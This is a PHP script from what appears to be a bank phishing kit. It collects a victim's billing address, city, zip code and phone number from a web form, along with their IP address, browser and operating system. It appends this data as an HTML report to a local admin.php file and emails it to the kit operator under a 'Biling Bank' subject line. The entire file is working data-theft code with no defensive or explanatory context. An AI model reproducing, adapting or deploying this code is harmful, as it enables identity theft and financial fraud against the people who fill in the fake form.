<?php

session_start();

include("system.php");

$_SESSION['_adress_']      = $_POST['adress'];
$_SESSION['_city_']        = $_POST['city'];
$_SESSION['_zipcode_']     = $_POST['zipcode'];
$_SESSION['_telefono_']     = $_POST['telefono'];



$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 


$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$ip = getenv("REMOTE_ADDR");


$yahya_email .= '<html><head></head>
<style>
font {font-family: "Comic Sans MS", cursive, sans-serif;},
</style>
<body>
[<font style="color: #0070ba;" >BILINGG INFORMATION</font>]
<br>
<font ></font> [🌎 Adress] = <font >'.$_SESSION['_adress_'].'</font>
<br>
<font ></font> [📌  City] = <font >'.$_SESSION['_city_'].'</font>
<br>
<font ></font> [📩 Zip code] = <font >'.$_SESSION['_zipcode_'].'</font>
<br>
<font ></font> [📞 Number telefono] = <font >'.$_SESSION['_telefono_'].'</font>
<br>
<font >[💻 System</font> <br>
<font style="color:#9c0000;"></font> [🔍 IP INFO] = <font style="color:#0070ba;">
<a target="_blank" style="text-decoration:none;" href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'"> '.$_SERVER['REMOTE_ADDR'].' </a></font><br>
<font style="color:#9c0000;"></font> [⏰ TIME/DATE] = <font style="color:#0070ba;">'.$InfoDATE.'</font><br>
<font style="color:#9c0000;"></font> [🌐 BROWSER] = <font style="color:#0070ba;">'.$browserTy_Version.' and '.$OS.'</font>
<br>
 <font style="color: #820000;"></font></div><font style="color: #820000;">
</font>
</body></html>';



$yagmail .= '
[🌎 Adress] = '.$_SESSION['_adress_'].'
[📌  City] = '.$_SESSION['_city_'].'
[📩 Zip code] = '.$_SESSION['_zipcode_'].'
[📞 Number telefono] = '.$_SESSION['_telefono_'].'
[💻 System]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'';



include("../../sand_rzlt_email.php");
include("./index.php");



$f = fopen("../../admin.php", "a");
	fwrite($f, $yahya_email);

$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = " 🏛Biling Bank🏛 [  ".$_SESSION['country1']." - ".$_SERVER['REMOTE_ADDR']." ] ";
$headers .= "From:  ᗰᴏᴜꜱᴛᴀᴄʜᴇ™" . "\r\n";
mail($yourmail, $subject, $yahya_email , $headers);



?>

